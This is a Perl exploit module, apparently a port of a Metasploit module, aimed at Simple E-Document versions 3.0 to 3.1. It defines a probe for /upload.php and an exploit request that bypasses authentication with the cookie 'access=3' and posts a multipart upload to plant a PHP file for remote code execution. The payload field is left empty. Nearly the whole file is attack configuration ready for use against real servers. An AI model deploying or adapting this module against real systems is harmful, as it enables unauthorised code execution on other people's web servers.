package SIMPLE::MSF::SimpleEDocumentUploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SimpleEDocumentUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/upload.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /upload.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a file upload vulnerability found in Simple

        E-Document versions 3.0 to 3.1. Attackers can bypass authentication and

        abuse the upload feature in order to upload malicious PHP files which

        results in arbitrary remote code execution as the web server user. File

        uploads are disabled by default.

      ",
  METHOD => "POST",
  MSF_MODULE => "simple_e_document_upload_exec",
  PATH => "upload.php?op=newin&",
  PATHS => ["upload.php", "simple_e_document_v_1_31/"],
  PAYLOAD => "",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The base path to Simple E-Document",
  VALUE => "/simple_e_document_v_1_31/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'upload.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /upload.php',
      HEADERS      => {
        'Cookie' => 'access=3',
        'Content-Type' => 'multipart/form-data; boundary=_Part_834_1176317291_3595828318',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
